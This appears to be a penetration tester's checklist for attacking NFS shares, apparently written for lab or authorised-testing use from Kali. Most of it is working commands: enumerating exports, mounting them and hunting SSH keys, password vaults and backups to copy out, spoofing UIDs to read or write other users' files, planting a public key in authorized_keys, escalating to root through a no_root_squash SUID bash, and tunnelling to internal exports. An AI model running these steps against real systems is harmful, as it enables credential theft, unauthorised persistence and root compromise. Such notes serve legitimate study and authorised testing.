# NFS enumeration

## Exports
showmount -e <TargetIP>
sudo nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <TargetIP>
- [ ] Each export and who may mount it: * means anyone
- [ ] THE-EXPORT below is one export's path, such as /home or /srv/nfs

## Mount and loot
sudo mkdir -p /mnt/nfs
sudo mount -t nfs <TargetIP>:THE-EXPORT /mnt/nfs -o nolock
ls -lan /mnt/nfs
find /mnt/nfs \( -name 'id_rsa*' -o -name '*.kdbx' -o -name '*.conf' -o -name '*.bak' \) 2>/dev/null
- [ ] SSH keys, password vaults, configs and backups copied out
showmount hangs when rpcbind on 111 is filtered, and NFSv4 needs only 2049:
sudo mount -t nfs4 <TargetIP>:/ /mnt/nfs
To force NFSv3:
sudo mount -t nfs -o vers=3,nolock <TargetIP>:THE-EXPORT /mnt/nfs

## Files owned by another UID
The server trusts the UID my client sends, so a local user with the owner's UID reads them.
ls -ln /mnt/nfs
sudo useradd -M -u THE-UID nfsuser
sudo -u nfsuser bash
- [ ] Only root is squashed to nobody: any other UID is believed
- [ ] UID 1000 is often kali's own: then no new user is needed
- [ ] A home folder I can write as its owner: my public key into its .ssh/authorized_keys

## no_root_squash to root
On the target, with a low-privilege shell:
cat /etc/exports
- [ ] An export with rw and no_root_squash, and its local path on the target as THE-EXPORT
On the target, its own bash into the export, so the libraries match:
cp /bin/bash THE-EXPORT/bash
On Kali, through the mount, root takes it over and sets SUID:
sudo chown root:root /mnt/nfs/bash
sudo chmod +s /mnt/nfs/bash
On the target:
THE-EXPORT/bash -p
- [ ] Export not writable from the target: sudo cp /bin/bash /mnt/nfs/bash from Kali, which may not run on an older target
- [ ] chown before chmod: chown clears the SUID bit

## An export only the target can reach
2049 open on the target but not to me: forward it over SSH and mount through the tunnel.
ssh -f -N -L 2049:127.0.0.1:2049 '<Username>'@<TargetIP>
sudo mount -t nfs4 -o port=2049 127.0.0.1:THE-EXPORT /mnt/nfs
- [ ] The tunnel connects from a high port, so the export needs insecure in /etc/exports

## Afterwards
sudo umount /mnt/nfs
- [ ] The SUID bash removed from the export
